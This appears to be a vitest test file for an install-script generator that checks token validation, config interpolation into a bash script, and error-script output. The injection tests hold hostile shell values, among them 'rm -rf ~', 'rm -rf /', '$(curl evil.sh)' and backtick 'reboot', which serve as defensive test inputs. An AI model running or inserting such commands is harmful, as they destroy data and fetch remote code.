// Wave 6 D2 — install-script lib. node-env vitest; pure logic only.

import { describe, it, expect } from "vitest";
import {
  isValidInstallToken,
  generateInstallScript,
  errorScript,
  INSTALL_TOKEN_RE,
} from "./install-script";

const NOW = new Date("2026-05-31T18:00:00.000Z");

describe("isValidInstallToken", () => {
  it("accepts a 32-char base64url token", () => {
    expect(isValidInstallToken("A".repeat(32))).toBe(true);
    expect(isValidInstallToken("aZ0_-bcdaZ0_-bcdaZ0_-bcdaZ0_-bcd")).toBe(true);
  });
  it("rejects too short / too long / bad chars / non-string", () => {
    expect(isValidInstallToken("short")).toBe(false);
    expect(isValidInstallToken("A".repeat(65))).toBe(false);
    expect(isValidInstallToken("has spaces and+slash/".padEnd(40, "x"))).toBe(false);
    expect(isValidInstallToken(null)).toBe(false);
    expect(isValidInstallToken(undefined)).toBe(false);
    expect(isValidInstallToken(12345)).toBe(false);
  });
  it("regex matches the SQL token shape (24 bytes → 32 base64url chars)", () => {
    expect(INSTALL_TOKEN_RE.test("x".repeat(32))).toBe(true);
  });
});

describe("generateInstallScript", () => {
  const cfg = {
    persona: "solo_founder",
    subscription_self_reported: "max",
    hardware_class: { gpu_class: "high-end", ram_class: "high", os_class: "mac" },
  };

  it("is a plain readable bash script (not obfuscated)", () => {
    const s = generateInstallScript(cfg, NOW);
    expect(s.startsWith("#!/usr/bin/env bash")).toBe(true);
    expect(s).toContain("set -euo pipefail");
    expect(s).toContain("curl ... | less"); // review-first guidance
  });

  it("interpolates persona / plan / gpu into the banner + profile", () => {
    const s = generateInstallScript(cfg, NOW);
    expect(s).toContain("solo_founder");
    expect(s).toContain("max plan");
    expect(s).toContain("high-end GPU");
    expect(s).toContain("2026-05-31T18:00:00.000Z"); // deterministic now
    expect(s).toContain('"pre_seeded_via_web": true');
  });

  it("defaults missing config fields honestly (no crash, no fabrication)", () => {
    const s = generateInstallScript(null, NOW);
    expect(s).toContain("other"); // persona fallback
    expect(s).toContain("api-only plan");
    expect(s).toContain("unknown GPU");
  });

  it("neutralizes a malicious config (no shell injection / heredoc break)", () => {
    const evil = {
      persona: "x'; rm -rf ~; echo '",
      subscription_self_reported: "$(curl evil.sh)",
      hardware_class: { gpu_class: "`reboot`", os_class: "a\nMOOTER_PROFILE_JSON\nrm -rf /" },
    };
    const s = generateInstallScript(evil, NOW);
    // Banner uses safeText → unsafe values collapse to fallbacks, never raw.
    expect(s).not.toContain("rm -rf ~");
    expect(s).not.toContain("$(curl evil.sh)");
    expect(s).not.toContain("`reboot`");
    // The heredoc terminator only appears as the opening + closing delimiter,
    // never injected from data.
    expect(s.match(/^MOOTER_PROFILE_JSON$/gm)?.length).toBe(1);
  });
});

describe("errorScript", () => {
  it("is a safe one-liner that exits non-zero", () => {
    const s = errorScript("Install token expired");
    expect(s).toContain("exit 1");
    expect(s).toContain("Install token expired");
  });
  it("strips shell metacharacters from the message", () => {
    const s = errorScript("bad $(rm -rf /) `reboot`");
    expect(s).not.toContain("$(");
    expect(s).not.toContain("`");
  });
});
